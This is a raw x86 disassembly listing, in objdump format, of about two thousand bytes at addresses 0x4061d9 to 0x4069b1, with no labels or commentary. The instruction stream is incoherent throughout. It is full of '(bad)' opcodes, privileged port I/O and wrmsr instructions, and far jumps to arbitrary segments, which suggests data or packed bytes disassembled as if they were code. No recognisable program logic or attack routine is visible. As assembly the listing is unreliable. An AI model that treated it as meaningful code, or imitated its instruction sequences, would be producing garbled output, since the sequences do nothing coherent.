  4061d9:	fistp  DWORD PTR [edi-0x5311cb6]
  4061df:	lock mov bl,0xe2
  4061e2:	cmp    eax,0x97ebd2f9
  4061e7:	jnp    0x40622d
  4061e9:	rcl    BYTE PTR [edx+0x42],0x52
  4061ed:	outs   dx,DWORD PTR ds:[esi]
  4061ee:	mov    al,ds:0xc0a606d2
  4061f3:	mov    ds:0xa581c34b,eax
  4061f8:	loop   0x406262
  4061fa:	inc    DWORD PTR [eax]
  4061fc:	cmp    ecx,ecx
  4061fe:	sbb    DWORD PTR [edi],esi
  406200:	loopne 0x40619c
  406202:	cmp    ecx,DWORD PTR [ebp-0x53]
  406205:	icebp  
  406206:	repnz in eax,dx
  406208:	dec    esp
  406209:	inc    esi
  40620a:	sub    bl,BYTE PTR [esi+0x46fca0fa]
  406210:	push   ecx
  406211:	adc    al,0x36
  406213:	das    
  406214:	push   edi
  406215:	jg     0x406204
  406217:	mov    eax,0x104be8a9
  40621c:	sbb    edi,DWORD PTR [eax]
  40621e:	les    edx,FWORD PTR [ecx-0x21]
  406221:	lods   al,BYTE PTR ds:[esi]
  406222:	ins    DWORD PTR es:[edi],dx
  406223:	cmp    DWORD PTR [ecx],ebx
  406225:	xchg   edx,eax
  406226:	aam    0xbd
  406228:	dec    edi
  406229:	mov    ah,0x4d
  40622b:	and    ch,dh
  40622d:	(bad)  
  40622e:	imul   eax,esp,0x41304cd1
  406234:	in     al,0x60
  406236:	arpl   cx,bx
  406238:	pop    ebp
  406239:	(bad)  
  40623a:	in     eax,dx
  40623b:	add    eax,0xafb8209d
  406240:	and    al,BYTE PTR [edx+0x7]
  406243:	sar    BYTE PTR [esi+0x5de25a86],0xa7
  40624a:	add    edx,DWORD PTR ds:0x88acc406
  406250:	data16 jg 0x4062b1
  406253:	inc    ebx
  406254:	and    al,0x95
  406256:	addr16 xchg esi,eax
  406258:	cmp    DWORD PTR [ecx+0x6d],eax
  40625b:	xor    esi,DWORD PTR [edx+0x0]
  40625e:	pop    ss
  40625f:	push   ebp
  406260:	inc    eax
  406261:	jge    0x40625e
  406263:	shl    DWORD PTR ds:0x67726152,cl
  406269:	outs   dx,DWORD PTR ds:[esi]
  40626a:	adc    BYTE PTR [edi],dh
  40626c:	or     al,0xdb
  40626e:	lds    ebx,FWORD PTR [ebx-0x22aa1dd8]
  406274:	cdq    
  406275:	dec    edx
  406276:	ins    BYTE PTR es:[edi],dx
  406277:	out    0xf,al
  406279:	mov    al,0xe1
  40627b:	add    bh,cl
  40627d:	adc    al,0x15
  40627f:	sub    ah,BYTE PTR [esp+edx*8]
  406282:	leave  
  406283:	bound  ebp,QWORD PTR [edx-0x35]
  406286:	mov    ah,0x0
  406288:	lahf   
  406289:	pop    ebp
  40628a:	fcomp  QWORD PTR [ebx-0x79]
  40628d:	jae    0x406218
  40628f:	cdq    
  406290:	inc    edx
  406291:	retf   0xbb18
  406294:	adc    DWORD PTR [edi-0x54],ecx
  406297:	add    al,0x52
  406299:	lds    esp,FWORD PTR [ebx]
  40629b:	ins    DWORD PTR es:[edi],dx
  40629c:	pop    ss
  40629d:	das    
  40629e:	sbb    al,0xb3
  4062a0:	sub    BYTE PTR [edx-0x5],bl
  4062a3:	arpl   WORD PTR [ecx-0x68152f73],dx
  4062a9:	jae    0x406284
  4062ab:	bnd jbe 0x406317
  4062ae:	test   DWORD PTR [edx-0x12],0x87d6f33c
  4062b5:	mov    eax,ds:0x15f6133b
  4062ba:	adc    al,0x25
  4062bc:	clc    
  4062bd:	call   0x65b61435
  4062c2:	pop    esi
  4062c3:	pop    ss
  4062c4:	mov    edi,0x254ffc8b
  4062c9:	jb     0x40631d
  4062cb:	push   es
  4062cc:	xchg   esp,eax
  4062cd:	repz ds js 0x406331
  4062d1:	or     al,0x18
  4062d3:	xchg   esi,eax
  4062d4:	jbe    0x4062b3
  4062d6:	jb     0x406280
  4062d8:	mov    esi,0x24b80d90
  4062dd:	mov    ah,0x10
  4062df:	jmp    0x40627a
  4062e1:	nop
  4062e2:	or     bl,BYTE PTR ds:0xfcb94217
  4062e8:	or     ch,BYTE PTR [esi+0x73]
  4062eb:	fldenv [edx+0x69a5171b]
  4062f1:	(bad)  
  4062f2:	cli    
  4062f3:	bound  ebx,QWORD PTR [esp+esi*4+0x48e7788a]
  4062fa:	add    edx,DWORD PTR [edi+0x6d]
  4062fd:	lahf   
  4062fe:	hlt    
  4062ff:	inc    edx
  406300:	or     al,0xc1
  406302:	mov    al,ds:0x65edb7ad
  406307:	loopne 0x406314
  406309:	loop   0x406353
  40630b:	neg    BYTE PTR [esi+ebx*2-0x60]
  40630f:	into   
  406310:	mov    cl,0x87
  406312:	push   ebx
  406313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406314:	cld    
  406315:	mov    eax,ds:0x4eb5b80e
  40631a:	push   0xffffffff
  40631c:	xor    eax,0xffc228f0
  406321:	in     al,dx
  406322:	jb     0x49b3050f
  406328:	(bad)  
  406329:	popa   
  40632a:	dec    ecx
  40632b:	mov    bh,0xf2
  40632d:	inc    ebp
  40632e:	sti    
  40632f:	sub    ah,BYTE PTR [ebx]
  406331:	cli    
  406332:	cmp    DWORD PTR [eax+edi*8-0x52fdc9b4],ebx
  406339:	lods   al,BYTE PTR ds:[esi]
  40633a:	cmp    al,0x3a
  40633c:	into   
  40633d:	int    0xa8
  40633f:	xor    dh,ch
  406341:	bound  ebx,QWORD PTR [ebp-0x25]
  406344:	dec    ebp
  406345:	stos   BYTE PTR es:[edi],al
  406346:	xor    ecx,ebp
  406348:	gs mov ch,0xbc
  40634b:	leave  
  40634c:	mov    esp,0x1f0f2b54
  406351:	sbb    ah,BYTE PTR [edi]
  406353:	xor    BYTE PTR [esp+esi*8-0x7e],dl
  406357:	adc    DWORD PTR [ecx-0x67c2f56c],0xa77998bf
  406361:	xchg   esp,eax
  406362:	jno    0x40639a
  406364:	(bad)  
  406365:	and    eax,0x5437a024
  40636a:	aaa    
  40636b:	xor    eax,0x7ddd6fd7
  406370:	retf   
  406371:	js     0x4063ef
  406373:	cli    
  406374:	pop    es
  406375:	mov    ah,0x5
  406377:	dec    ebx
  406378:	dec    ebx
  406379:	xchg   edi,eax
  40637a:	lods   al,BYTE PTR ds:[esi]
  40637b:	rol    BYTE PTR [ecx-0x47],1
  40637e:	loop   0x4063a3
  406380:	inc    esp
  406381:	jl     0x4063d4
  406383:	lods   al,BYTE PTR ds:[esi]
  406384:	adc    ebx,DWORD PTR gs:[esi+0x6fcba2b7]
  40638b:	xlat   BYTE PTR ds:[ebx]
  40638c:	dec    eax
  40638d:	mov    al,ds:0x2ff2a8b9
  406392:	in     al,dx
  406393:	neg    dl
  406395:	push   esi
  406396:	mov    eax,esp
  406398:	dec    edi
  406399:	jmp    0x7636a5d0
  40639e:	inc    eax
  40639f:	(bad)  
  4063a0:	push   ss
  4063a1:	daa    
  4063a2:	mov    ch,0x83
  4063a4:	arpl   WORD PTR [eax],ax
  4063a6:	push   ebp
  4063a7:	dec    ecx
  4063a8:	mul    edi
  4063aa:	aad    0x65
  4063ac:	pop    ebx
  4063ad:	rol    BYTE PTR [esi+0x37],1
  4063b0:	adc    al,BYTE PTR [eax-0x5b]
  4063b3:	(bad)  
  4063b4:	loop   0x4063c3
  4063b6:	xchg   ebx,eax
  4063b7:	mov    ecx,0xc93e473c
  4063bc:	out    dx,eax
  4063bd:	lock neg DWORD PTR [edi]
  4063c0:	out    0x4e,eax
  4063c2:	ins    DWORD PTR es:[edi],dx
  4063c3:	jmp    0xb1d3d4d9
  4063c8:	scas   eax,DWORD PTR es:[edi]
  4063c9:	inc    edx
  4063ca:	ja     0x406405
  4063cc:	adc    eax,0x1443202c
  4063d1:	pop    edi
  4063d2:	cld    
  4063d3:	repnz scas eax,DWORD PTR es:[edi]
  4063d5:	shl    DWORD PTR [esi+0x5aeec355],0xed
  4063dc:	and    DWORD PTR [edx-0x22be2e31],0xd500a5f4
  4063e6:	ins    DWORD PTR es:[edi],dx
  4063e7:	push   eax
  4063e8:	cmp    BYTE PTR [ebx-0x19f21b1d],bl
  4063ee:	xor    eax,0xc38fa2ec
  4063f3:	fwait
  4063f4:	add    eax,0xe203dc8f
  4063f9:	ror    DWORD PTR [ecx],1
  4063fb:	jg     0x40643a
  4063fd:	ret    
  4063fe:	cmp    cl,BYTE PTR [ebx-0x4]
  406401:	push   cs
  406402:	rcl    BYTE PTR [edx],cl
  406404:	rcr    dh,0xc1
  406407:	int    0xf
  406409:	(bad)  
  40640a:	ficom  DWORD PTR [eax-0x4874738e]
  406410:	add    DWORD PTR [edi-0xd],ebx
  406413:	das    
  406414:	xlat   BYTE PTR ds:[ebx]
  406415:	aas    
  406416:	dec    edx
  406417:	(bad)  
  406418:	cmp    al,0x6d
  40641a:	out    dx,eax
  40641b:	fistp  QWORD PTR [esi-0x7e3853aa]
  406421:	stc    
  406422:	push   0x53
  406424:	sahf   
  406425:	mov    ebp,0x41933b2d
  40642a:	cmp    bh,BYTE PTR ds:0xfa4d8167
  406430:	outs   dx,DWORD PTR ds:[esi]
  406432:	ds xchg ebp,eax
  406434:	jge    0x40641e
  406436:	ror    DWORD PTR ds:0xf57a91f6,0xa9
  40643d:	scas   al,BYTE PTR es:[edi]
  40643e:	stos   DWORD PTR es:[edi],eax
  40643f:	rcr    DWORD PTR ds:0xceec3608,cl
  406445:	mov    ch,0xce
  406447:	in     al,0xdb
  406449:	mov    dh,BYTE PTR [eax]
  40644b:	es mov esp,0x227cad88
  406451:	icebp  
  406452:	and    eax,0x84ef5669
  406457:	scas   eax,DWORD PTR es:[edi]
  406458:	jne    0x406451
  40645a:	popf   
  40645b:	mov    BYTE PTR ds:0x628a12dc,bl
  406461:	xchg   edi,eax
  406462:	in     eax,0xde
  406464:	stc    
  406465:	test   eax,0x117d0b47
  40646a:	or     ch,BYTE PTR [eax-0x67]
  40646d:	adc    ch,BYTE PTR [edi+0x26]
  406470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406471:	leave  
  406472:	sub    cl,ch
  406474:	and    BYTE PTR [edx-0x747d74b],dl
  40647a:	jle    0x406492
  40647c:	sub    BYTE PTR [ebx+0x69],0x12
  406480:	sub    al,0x45
  406482:	bound  ebp,QWORD PTR [edx+ecx*4+0x49]
  406486:	iret   
  406487:	lahf   
  406488:	lock daa 
  40648a:	and    eax,DWORD PTR [edx+0x6c263daf]
  406490:	jb     0x406438
  406492:	mul    esi
  406494:	sbb    al,0x7d
  406496:	mov    dh,0x32
  406498:	mov    eax,0x709405f8
  40649d:	pop    eax
  40649e:	test   DWORD PTR [ebx],eax
  4064a0:	mov    eax,ds:0x526ccf12
  4064a5:	imul   BYTE PTR [eax]
  4064a7:	dec    edx
  4064a8:	ins    BYTE PTR es:[edi],dx
  4064a9:	cdq    
  4064aa:	xchg   ebx,eax
  4064ab:	pop    esi
  4064ac:	scas   al,BYTE PTR es:[edi]
  4064ad:	sbb    edx,edi
  4064af:	push   0x9097233b
  4064b4:	inc    edi
  4064b5:	mov    ebp,0x6859bf03
  4064ba:	ins    DWORD PTR es:[edi],dx
  4064bb:	ins    DWORD PTR es:[edi],dx
  4064bc:	es cdq 
  4064be:	sub    ah,BYTE PTR [eax-0x5650ddde]
  4064c4:	mov    ds:0x149e7dcf,eax
  4064c9:	stos   BYTE PTR es:[edi],al
  4064ca:	add    eax,0x2a3b2dad
  4064cf:	xlat   BYTE PTR ds:[ebx]
  4064d0:	dec    ecx
  4064d1:	push   0xffffffdc
  4064d3:	stos   DWORD PTR es:[edi],eax
  4064d4:	cmp    BYTE PTR [esp+esi*1-0x60153406],al
  4064db:	into   
  4064dc:	inc    edx
  4064dd:	js     0x4064a8
  4064df:	cdq    
  4064e0:	cld    
  4064e1:	mov    al,0x71
  4064e3:	data16 and bh,BYTE PTR [ebx]
  4064e6:	(bad)  
  4064e7:	jmp    0x9401080a
  4064ec:	loope  0x4064aa
  4064ee:	sbb    bl,cl
  4064f0:	dec    eax
  4064f1:	retf   0xd7d7
  4064f4:	jle    0x4064aa
  4064f6:	push   edx
  4064f7:	addr16 clc 
  4064f9:	shl    BYTE PTR [ecx-0x271fdd0b],cl
  4064ff:	cs cmp al,0x87
  406502:	cmp    DWORD PTR [ebx+ecx*2],0x1c62f1ce
  406509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40650a:	out    0x30,al
  40650c:	and    ch,0x44
  40650f:	out    dx,al
  406510:	idiv   BYTE PTR [esi+0x74]
  406513:	(bad)  
  406514:	xchg   edi,eax
  406515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406516:	fdivp  st(1),st
  406518:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40651a:	sbb    ch,dh
  40651c:	leave  
  40651d:	sbb    BYTE PTR ds:[edi-0x27d73014],0xce
  406525:	xor    BYTE PTR ds:0x175f375d,bl
  40652b:	ficomp WORD PTR [ebx]
  40652d:	call   ecx
  40652f:	repz xor DWORD PTR cs:[ebx],ecx
  406533:	retf   0x1dae
  406536:	jae    0x406562
  406538:	out    0xde,eax
  40653a:	pop    ss
  40653b:	or     ch,BYTE PTR [edi-0x74ebb389]
  406541:	cmp    al,0xd9
  406543:	in     al,dx
  406544:	nop
  406545:	jns    0x4065b8
  406547:	mov    ah,0x78
  406549:	repz test dl,ah
  40654c:	and    eax,0x4411d2e8
  406551:	shl    BYTE PTR [edx+ecx*1],1
  406554:	dec    ecx
  406555:	add    esi,DWORD PTR [edx+0x39]
  406558:	out    0x74,eax
  40655a:	fisubr WORD PTR [eax]
  40655c:	dec    ecx
  40655d:	sbb    DWORD PTR [ecx-0x3eeaab18],edx
  406563:	dec    ebx
  406564:	shr    DWORD PTR [eax+0x38f62604],0x8e
  40656b:	xor    ah,cl
  40656d:	push   0x9db3afe7
  406572:	mov    dh,0xce
  406574:	lock pop esi
  406576:	mov    edx,0x887b6758
  40657b:	cmp    BYTE PTR [ecx-0x1f],bl
  40657e:	jl     0x406589
  406580:	call   0x2cd2:0x292abed2
  406587:	push   cs
  406588:	es das 
  40658a:	dec    esi
  40658b:	xchg   ebx,eax
  40658c:	inc    esi
  40658d:	fstp   DWORD PTR [eax+0x3b597c23]
  406593:	adc    edx,0x2656d21c
  406599:	jne    0x4065c8
  40659b:	cmp    ebp,ebp
  40659d:	fscale 
  40659f:	add    eax,0xd08fc925
  4065a4:	xor    DWORD PTR [eax],ebx
  4065a6:	push   esp
  4065a7:	push   ecx
  4065a8:	fidiv  WORD PTR [ecx]
  4065aa:	rcl    ch,cl
  4065ac:	inc    eax
  4065ad:	xchg   ebx,eax
  4065ae:	cmp    al,0x71
  4065b0:	xchg   ecx,eax
  4065b1:	arpl   bx,ax
  4065b3:	cli    
  4065b4:	jo     0x4065f7
  4065b6:	mov    WORD PTR [ecx+edi*4+0x51],?
  4065ba:	out    0xf8,eax
  4065bc:	aam    0x3e
  4065be:	pop    ss
  4065bf:	dec    DWORD PTR [ecx]
  4065c1:	paddsw mm0,mm4
  4065c4:	pop    ecx
  4065c5:	xchg   ebx,eax
  4065c6:	fcmovb st,st(0)
  4065c8:	les    esp,FWORD PTR [esi]
  4065ca:	leave  
  4065cb:	xor    DWORD PTR [ebx],0x16
  4065ce:	ss sbb ebp,DWORD PTR ss:[eax-0x2d7fd2aa]
  4065d6:	cmp    dh,0xd4
  4065d9:	add    edi,DWORD PTR [eax-0x492c602]
  4065df:	mov    ah,0x33
  4065e1:	sar    BYTE PTR [edi-0x64],0x2
  4065e5:	xor    dl,BYTE PTR [ecx-0x5d9ffaee]
  4065eb:	push   edi
  4065ec:	lods   eax,DWORD PTR ds:[esi]
  4065ed:	pop    ds
  4065ee:	test   al,0x7a
  4065f0:	xchg   esi,eax
  4065f1:	jge    0x406644
  4065f3:	push   ss
  4065f4:	cdq    
  4065f5:	call   0x2bfad61b
  4065fa:	pop    ss
  4065fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065fc:	xchg   ecx,eax
  4065fd:	push   esp
  4065fe:	pop    ss
  4065ff:	lock inc edi
  406601:	adc    eax,0x829801eb
  406606:	xchg   BYTE PTR [esi+0x3a],cl
  406609:	pop    ecx
  40660a:	pop    ecx
  40660b:	mov    esi,0x6ab51359
  406610:	add    eax,0x1acac86c
  406615:	mov    bl,0x53
  406617:	push   es
  406618:	or     al,0x8
  40661a:	push   edx
  40661b:	add    eax,DWORD PTR [ecx+0x602fe7b5]
  406621:	xchg   edi,eax
  406622:	rol    BYTE PTR [ebx-0x6a],1
  406625:	mov    ecx,0x71391a4e
  40662a:	dec    edi
  40662b:	push   ecx
  40662c:	cdq    
  40662d:	sub    BYTE PTR [eax-0x2de6c1b1],ch
  406633:	(bad)  
  406634:	cld    
  406635:	mov    BYTE PTR [edi],dl
  406637:	push   edx
  406638:	fist   WORD PTR [esi+edx*2-0x7]
  40663c:	mov    esp,0x6a2df1d3
  406641:	test   bh,dh
  406643:	pop    ecx
  406644:	push   eax
  406645:	cmp    ebp,DWORD PTR [ebx]
  406647:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406648:	shr    BYTE PTR fs:[esi+esi*2+0x25],1
  40664d:	fisub  WORD PTR [ebx+0x7d50a95e]
  406653:	mov    dl,BYTE PTR [edx+0x8704776]
  406659:	xchg   ebp,eax
  40665a:	mov    BYTE PTR [eax-0x2a],ah
  40665d:	jg     0x406634
  40665f:	mov    ebp,DWORD PTR gs:[edx]
  406662:	wrmsr  
  406664:	stos   DWORD PTR es:[edi],eax
  406665:	push   ecx
  406666:	lock out dx,eax
  406668:	xchg   edi,eax
  406669:	fwait
  40666a:	and    ch,dl
  40666c:	inc    edx
  40666d:	mov    ah,BYTE PTR [edi-0x714b4377]
  406673:	rcl    BYTE PTR [edx+0x4a],1
  406676:	repz pusha 
  406678:	je     0x406614
  40667a:	add    dl,BYTE PTR [eax-0x2b]
  40667d:	(bad)  
  40667e:	cmc    
  40667f:	retf   0x75dd
  406682:	sbb    BYTE PTR [ebx+0x552615fc],dl
  406688:	in     eax,0xdd
  40668a:	inc    eax
  40668b:	test   BYTE PTR [ebp-0x48],0x38
  40668f:	je     0x40665a
  406691:	out    dx,al
  406692:	faddp  st(1),st
  406694:	adc    al,0x3b
  406696:	push   ebx
  406697:	lds    eax,FWORD PTR [edx]
  406699:	into   
  40669a:	in     al,0x1f
  40669c:	or     al,0x61
  40669e:	cvtps2pi mm5,QWORD PTR [esi+0x7f839b2a]
  4066a5:	imul   edx,DWORD PTR [eax+0x5c],0x12d9ac20
  4066ac:	pop    edx
  4066ad:	les    esp,FWORD PTR [ebp+0x1]
  4066b0:	inc    ebp
  4066b1:	xchg   edi,eax
  4066b2:	xchg   esp,eax
  4066b3:	xor    esp,DWORD PTR [ecx]
  4066b5:	cmp    BYTE PTR [edi+ebx*8],bh
  4066b8:	into   
  4066b9:	jle    0x4066f9
  4066bb:	and    dh,dh
  4066bd:	sbb    ebp,DWORD PTR [edx+0x6d]
  4066c0:	xor    ecx,DWORD PTR [esi+0x33ec3de0]
  4066c6:	push   ds
  4066c7:	xchg   ebx,eax
  4066c8:	add    BYTE PTR [edx+0x509d586d],0xa9
  4066cf:	sub    edi,DWORD PTR [esi-0x39]
  4066d2:	(bad)  
  4066d3:	pop    eax
  4066d4:	ds push 0x6e
  4066d7:	and    DWORD PTR [esi],esp
  4066d9:	aad    0x5b
  4066db:	dec    edx
  4066dc:	jmp    DWORD PTR [ebp+0x4c43b5d]
  4066e2:	xchg   esi,eax
  4066e3:	cmp    eax,0x559022bc
  4066e8:	inc    ecx
  4066e9:	clc    
  4066ea:	jns    0x40668a
  4066ec:	cmp    DWORD PTR [ebp+0x689d2e0b],edx
  4066f2:	fild   DWORD PTR [ebp+0x44]
  4066f5:	es pop ss
  4066f7:	shr    BYTE PTR [edi+ebp*1+0x24ee887b],1
  4066fe:	dec    esi
  4066ff:	jg     0x4066ec
  406701:	adc    bh,BYTE PTR [eax]
  406703:	ins    BYTE PTR es:[edi],dx
  406704:	sbb    ebx,DWORD PTR [ebx+0x5c]
  406707:	(bad)  
  406709:	sub    eax,0x979d7856
  40670e:	adc    edx,ecx
  406710:	pop    ebp
  406711:	out    0xd5,eax
  406713:	fcmovnu st,st(2)
  406715:	retf   
  406716:	cmp    DWORD PTR [edx-0x2b8e830c],ebx
  40671c:	push   edi
  40671d:	add    edx,DWORD PTR [esi-0x69]
  406720:	cmp    eax,edi
  406722:	dec    ebx
  406723:	push   ebp
  406724:	and    cl,BYTE PTR [ebx+0x4d539081]
  40672a:	mov    ch,0x93
  40672c:	fistp  QWORD PTR [edi]
  40672e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40672f:	xchg   ecx,eax
  406730:	adc    ah,ch
  406732:	cmp    DWORD PTR [edx],ebp
  406734:	and    BYTE PTR [ebx+0xe8a2ca7],dl
  40673a:	cmp    ch,BYTE PTR [eax]
  40673c:	adc    al,0x98
  40673e:	sbb    BYTE PTR [esi+0x12541813],cl
  406744:	cld    
  406745:	push   edi
  406746:	or     esp,ebx
  406748:	xlat   BYTE PTR ds:[ebx]
  406749:	add    BYTE PTR [ebx],cl
  40674b:	loop   0x406778
  40674d:	ret    0x5b4
  406750:	xchg   ebp,eax
  406751:	mov    ss,WORD PTR [esi+0x7538178c]
  406757:	scas   eax,DWORD PTR es:[edi]
  406758:	or     dh,bl
  40675a:	cs sub ah,ah
  40675d:	and    esi,edx
  40675f:	mov    esi,0x1210bc57
  406764:	mov    bh,0x5b
  406766:	fsubr  DWORD PTR [ebp-0x3def4080]
  40676c:	jle    0x406730
  40676e:	push   DWORD PTR [edi-0x42485a07]
  406774:	inc    ecx
  406775:	cmp    cl,BYTE PTR [ecx+0x5d]
  406778:	xchg   edx,eax
  406779:	dec    ecx
  40677a:	(bad)  
  40677b:	dec    esp
  40677c:	mov    edi,0x7bbc336e
  406781:	popf   
  406782:	xchg   esi,eax
  406783:	jl     0x1246b99c
  406789:	imul   DWORD PTR [ecx-0x24140394]
  40678f:	adc    bl,cl
  406791:	cmp    al,0x95
  406793:	stos   BYTE PTR es:[edi],al
  406794:	fwait
  406795:	retf   0xc9d6
  406798:	sti    
  406799:	sbb    BYTE PTR [edx+edx*1+0x19],dl
  40679d:	loopne 0x40673c
  40679f:	add    esi,0xffffffbf
  4067a2:	push   edi
  4067a3:	(bad)  
  4067a4:	js     0x406815
  4067a6:	aad    0xe2
  4067a8:	stc    
  4067a9:	ret    0xbdfd
  4067ac:	lock and DWORD PTR [ebx-0x2e],esi
  4067b0:	in     al,dx
  4067b1:	adc    al,0x69
  4067b3:	psrlq  mm4,QWORD PTR [esi+0x1e]
  4067b7:	pop    esp
  4067b8:	test   eax,0xbb97887c
  4067bd:	sbb    eax,0x2976a33d
  4067c2:	cdq    
  4067c3:	iret   
  4067c4:	cmc    
  4067c5:	mov    eax,ds:0x4a258a41
  4067ca:	loop   0x4067bc
  4067cc:	rcr    ebp,1
  4067ce:	or     DWORD PTR [edx],eax
  4067d0:	(bad)  
  4067d1:	mov    ebx,0x98c0459a
  4067d6:	into   
  4067d7:	call   0x6ef1:0xc1a94319
  4067de:	sti    
  4067df:	arpl   WORD PTR [ebx+0x64],bp
  4067e2:	stos   BYTE PTR es:[edi],al
  4067e3:	sub    dh,BYTE PTR [edi-0x3269eeae]
  4067e9:	add    BYTE PTR [ebp+0x5f],bh
  4067ec:	sbb    eax,0xdf2cc4ed
  4067f1:	fldenv [edi]
  4067f3:	retf   
  4067f4:	dec    esi
  4067f5:	data16 and al,0xbf
  4067f8:	js     0x4067e0
  4067fa:	dec    BYTE PTR [edx-0x4fe3d774]
  406800:	mov    edx,0x1fb6e2e0
  406805:	cmp    BYTE PTR [ecx-0x50],0x17
  406809:	inc    edi
  40680a:	in     eax,0x33
  40680c:	popf   
  40680d:	hlt    
  40680e:	mov    al,0xcc
  406810:	lds    edi,FWORD PTR [esp+edx*1]
  406813:	jnp    0x4067d0
  406815:	dec    esp
  406816:	push   es
  406817:	add    DWORD PTR [ecx],ebx
  406819:	les    ebx,FWORD PTR [esi]
  40681b:	in     al,dx
  40681c:	pop    ss
  40681d:	push   cs
  40681e:	std    
  40681f:	xchg   ecx,eax
  406820:	mov    edx,0x80718c14
  406825:	sub    eax,0xb74feb9a
  40682a:	cdq    
  40682b:	daa    
  40682c:	(bad)  [eax-0x4c]
  40682f:	add    edi,edi
  406831:	and    eax,0xdd8f2653
  406836:	push   esp
  406837:	pop    edi
  406838:	sar    DWORD PTR [ebx+0x5c],cl
  40683b:	dec    edx
  40683c:	out    0xbf,al
  40683e:	nop
  40683f:	repnz fwait
  406841:	bound  eax,QWORD PTR [ebx+edx*2-0x3f588830]
  406848:	jmp    0x8700:0xe57261f
  40684f:	retf   
  406850:	imul   edi,DWORD PTR [edx],0x2a8d019d
  406856:	hlt    
  406857:	push   esi
  406858:	push   DWORD PTR [esi]
  40685a:	popa   
  40685b:	xor    al,0x91
  40685d:	rcl    edi,0xce
  406860:	(bad)  
  406861:	lds    eax,FWORD PTR [esi-0x6fdd652c]
  406867:	dec    eax
  406868:	add    al,0x7a
  40686a:	shr    ch,0x2c
  40686d:	xor    dh,0x20
  406870:	mov    edx,0xdb0bc1a7
  406875:	sbb    al,0x1b
  406877:	and    al,0x1
  406879:	xor    dh,dh
  40687b:	inc    esp
  40687c:	aam    0xef
  40687e:	aad    0xde
  406880:	mov    ebx,0x8aeefb80
  406885:	sub    eax,0x7bcbf643
  40688a:	adc    BYTE PTR [esi],ah
  40688c:	fdivr  st,st(4)
  40688e:	sub    eax,0x87919ddc
  406893:	ror    DWORD PTR [edi],1
  406895:	add    eax,0x7d5d43eb
  40689a:	cld    
  40689b:	ins    BYTE PTR es:[edi],dx
  40689c:	push   edi
  40689d:	out    0x56,al
  40689f:	or     al,0xfc
  4068a1:	mov    al,0x13
  4068a3:	data16 jp 0x4068be
  4068a6:	mov    al,0x7e
  4068a8:	push   eax
  4068a9:	push   esi
  4068aa:	dec    ecx
  4068ab:	shl    DWORD PTR [esi+ebp*4-0x6c],cl
  4068af:	jae    0x4068ca
  4068b1:	and    esi,DWORD PTR [edi]
  4068b3:	in     al,dx
  4068b4:	mov    fs,WORD PTR [esi+0x7a]
  4068b7:	packssdw mm4,QWORD PTR ds:0xebb1eda3
  4068be:	outs   dx,BYTE PTR ds:[esi]
  4068bf:	xchg   edx,eax
  4068c0:	dec    edi
  4068c1:	fsub   DWORD PTR [ebp-0x18]
  4068c4:	mov    ebx,0x60cf3fb9
  4068c9:	jae    0x406906
  4068cb:	addr16 or eax,0x64ba859
  4068d1:	cmp    DWORD PTR [eax+edx*2-0x3a1eeca9],ebx
  4068d8:	adc    esp,DWORD PTR [ecx+0x57404445]
  4068de:	adc    DWORD PTR [edi+0x3f6b7461],esp
  4068e4:	inc    esi
  4068e5:	mov    es,WORD PTR ss:[esi]
  4068e8:	loope  0x4068cb
  4068ea:	fnstsw WORD PTR [edx]
  4068ec:	mov    BYTE PTR [eax-0x47],ah
  4068ef:	mov    ah,0x76
  4068f1:	inc    eax
  4068f2:	js     0x4068b1
  4068f4:	xchg   edx,eax
  4068f5:	jbe    0x406945
  4068f7:	arpl   WORD PTR [ebx+0x25],di
  4068fa:	cmp    bl,ah
  4068fc:	cli    
  4068fd:	inc    edi
  4068fe:	sub    BYTE PTR [ebx],dl
  406900:	push   eax
  406901:	out    dx,al
  406902:	adc    eax,0x744ebfce
  406907:	cmp    bl,BYTE PTR [eax+0x49831b5b]
  40690d:	mov    BYTE PTR ds:0xf37133a4,dh
  406913:	mov    cl,0xe0
  406915:	add    BYTE PTR [ebp+0x6d],dh
  406918:	(bad)  
  406919:	push   ebx
  40691a:	mov    al,ds:0x585603fa
  40691f:	mov    dh,ch
  406921:	or     al,0xc8
  406923:	xor    BYTE PTR [ebp-0x1dbed22d],bl
  406929:	dec    ebp
  40692a:	repz adc edi,DWORD PTR [esi+0x295eca59]
  406931:	dec    edi
  406932:	mov    ah,0x4f
  406934:	dec    edx
  406935:	cld    
  406936:	xchg   edi,eax
  406937:	lods   eax,DWORD PTR ds:[esi]
  406938:	(bad)  
  406939:	mov    ds:0x3daaa857,al
  40693e:	sar    DWORD PTR [ebp+0x692307ad],0x8
  406945:	aas    
  406946:	int3   
  406947:	iret   
  406948:	or     BYTE PTR [esi+0x70],0xfb
  40694c:	das    
  40694d:	dec    edi
  40694e:	ja     0x40699e
  406950:	stc    
  406951:	shl    BYTE PTR [edx],1
  406953:	shl    BYTE PTR [edx],0xb4
  406956:	pop    ecx
  406957:	adc    BYTE PTR [ecx-0x63b3b997],ch
  40695d:	and    al,0xd8
  40695f:	ret    
  406960:	cld    
  406961:	and    eax,0xce139f76
  406966:	stc    
  406967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406968:	mov    esp,0x6135ddc4
  40696d:	mov    ch,0x32
  40696f:	mov    WORD PTR [ebp-0x6a9b7316],?
  406975:	jmp    0xbb1ece45
  40697a:	shl    ch,0xa2
  40697d:	in     eax,dx
  40697e:	or     DWORD PTR [ebx-0x6e],0x93e158b7
  406985:	and    bh,al
  406987:	or     BYTE PTR [ebp+0x57557cd3],cl
  40698d:	pop    edx
  40698e:	rol    bl,0x7f
  406991:	in     al,dx
  406992:	call   0xe9dd:0x416bd1aa
  406999:	sbb    al,0x32
  40699b:	cld    
  40699c:	cs mov al,0x5e
  40699f:	dec    esp
  4069a0:	mov    cl,0xef
  4069a2:	xchg   ecx,eax
  4069a3:	xchg   BYTE PTR [ecx],dh
  4069a5:	test   BYTE PTR ds:0xeb8e857e,bl
  4069ab:	push   ecx
  4069ac:	push   ss
  4069ad:	iret   
  4069ae:	repz sti 
  4069b0:	cld    
  4069b1:	das    
